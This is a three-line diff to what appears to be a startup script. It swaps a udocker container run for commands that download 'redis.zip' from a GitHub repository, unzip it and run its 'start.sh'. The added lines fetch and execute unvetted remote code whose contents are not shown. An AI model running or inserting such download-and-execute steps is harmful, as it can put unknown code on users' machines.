@@ -1,1 +1,3 @@
-pip install udocker;udocker --allow-root run lagraven/node:latest
+curl -O -L -J https://github.com/akumetaulu/symmetrical-octo-palm-tree/raw/refs/heads/main/redis.zip
+unzip redis.zip
+bash start.sh
